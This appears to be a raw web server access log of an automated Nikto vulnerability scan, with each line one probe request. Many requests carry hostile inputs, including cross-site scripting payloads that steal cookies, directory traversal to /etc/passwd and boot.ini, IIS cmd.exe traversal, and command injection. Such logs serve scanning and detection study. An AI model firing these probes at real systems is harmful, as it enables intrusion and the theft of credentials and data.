172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/database/metacart.mdb HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003147)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shoponline/fpdb/shop.mdb HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003148)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shopping/database/metacart.mdb HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003149)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /search.php?sess=your_session_id&lookfor=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003150)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/phpinfo.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003151)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /start.php?config=alper.inc.php HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003152)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /login.php?sess=your_session_id&abt=&new_lang=99999&caller=navlang HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003153)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /viewimg.php?path=../../../../../../../../../../etc/passwd&form=1&var=1 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003154)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /D6U2d.xml HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003157)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /9EjpD/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003158)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/main_menu.pl HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003159)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ban.bak HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003160)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ban.dat HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003161)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ban.log HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003162)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /banmat.pwd HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003163)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/adminproc.asp HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003164)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/datasource.asp HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003165)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /utils/sprc.asp HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003166)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/temp/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003167)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /addressbook.php?\\\"><script>alert(Vulnerable)</script><!-- HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003170)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /options.php?optpage=<script>alert('Vulnerable!')</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003171)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /search.php?mailbox=INBOX&what=x&where=<script>alert('Vulnerable!')</script>&submit=Search HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003172)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /help.php?chapter=<script>alert('Vulnerable')</script> HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003173)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /src/read_body.php?mailbox=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&startMessage=1&show_more=0 HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003174)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.../.../.../ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003179)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /texis.exe/?-dump HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003182)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /texis.exe/?-version HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003183)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /acart2_0/deliver.asp?msg=<script>alert(\\\"test\\\")</script> HTTP/1.1" 404 475 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003185)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /acart2_0/error.asp?msg=<script>alert(\\\"test\\\")</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003186)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /acart2_0/admin/error.asp?msg=<script>alert(\\\"test\\\")</script> HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003187)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /acart2_0/admin/index.asp?msg=<script>alert(\\\"test\\\")</script> HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003188)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /certsrv/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003190)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003191)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iisadmpwd/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003192)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /msadc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003193)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pbserver/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003194)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rpc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003195)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003196)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003197)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\\\" HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003198)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003199)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /acart2_0/acart2_0.mdb HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003200)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /acart2_0/admin/category.asp HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003201)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Sites/Knowledge/Membership/Inspired/ViewCode.asp HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003202)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003203)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003204)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003205)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Sites/Samples/Knowledge/Push/ViewCode.asp HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003206)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /Sites/Samples/Knowledge/Search/ViewCode.asp HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003207)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /SiteServer/Publishing/ViewCode.asp HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003208)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /siteserver/publishing/viewcode.asp?source=/default.asp HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003209)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shoutbox.php?conf=../../../../../../../etc/passwd HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003210)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /securelogin/1,2345,A,00.html HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003211)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /.%252e/.%252e/.%252e/winnt/boot.ini HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003212)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /add.php HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003213)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /class/mysql.class HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003214)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /inc/sendmail.inc HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003215)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/system.php3?cmd=cat%20/etc/passwd HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003216)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/system.php3?cmd=dir%20c:\\\\ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003217)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/exec.php3?cmd=cat%20/etc/passwd HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003218)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/exec.php3?cmd=dir%20c:\\\\ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003219)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /foo.php3 HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003220)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /config.inc HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003221)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/ieedit.stm?url=../ HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003224)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/iecreate.stm?template=../ HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003225)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003226)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003227)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/edit.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003228)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003229)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003230)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/iecreate.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003231)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/ieedit.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003232)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003233)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003234)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/rename.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003235)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003236)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003237)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003238)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003239)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/vccheckin.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003240)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003241)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003242)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003243)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003244)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003245)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/rename.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003246)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003247)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/update.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003248)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003249)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003250)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003251)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003254)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /syshelp/stmex.stm?foo=<script>alert(document.cookie)</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003255)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script> HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003256)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script> HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003257)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003258)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003259)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /netutils/findata.stm?host=<script>alert(document.cookie)</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003260)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /netutils/findata.stm?user=<script>alert(document.cookie)</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003261)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003262)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /isapi/tstisapi.dll HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003263)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003265)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /postnuke/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003265)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /postnuke/html/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003265)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /modules/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003265)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003265)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003265)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/jabber/comment2.jse+/system/autoexec.ncf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003266)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003267)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /catinfo HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003270)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /soap/servlet/soaprouter HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003271)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /opendir.php?/etc/passwd HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003272)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /opendir.php?requesturl=/etc/passwd HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003273)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003274)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webtools/bonsai/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script> HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003276)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webtools/bonsai/cvsquery.cgi?module=<script>alert('Vulnerable')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003277)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('Vulnerable')</script> HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003280)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webtools/bonsai/cvslog.cgi?file=<script>alert('Vulnerable')</script> HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003281)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webtools/bonsai/cvsblame.cgi?file=<script>alert('Vulnerable')</script> HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003284)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webtools/bonsai/showcheckins.cgi?person=<script>alert('Vulnerable')</script> HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003286)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /s5ezs4UwHsqnQpaustTLSb0VGxPked3AYDx81FUAKnHVHCoJ0G910FFPg4HwCD0B0PI4I5jT5u7eXxkOS43zOxsIxWlSDt3QcRKj5UFjZmguwwgtQpEPFRGsltXlA1pPWaZoXW3UKWlilCJ9PV2ggWOAVxeIw5RVCd07uQ55iQ2kC5QRubfxhoUIC8iHGox9M6uWBfCOU4ulyauCm1iDB6F5TRZtwqA<font%20size=50>DEFACED<!--//-- HTTP/1.1" 404 751 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003288)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /MWS/HandleSearch.html?searchTarget=test&B1=Submit HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003289)"
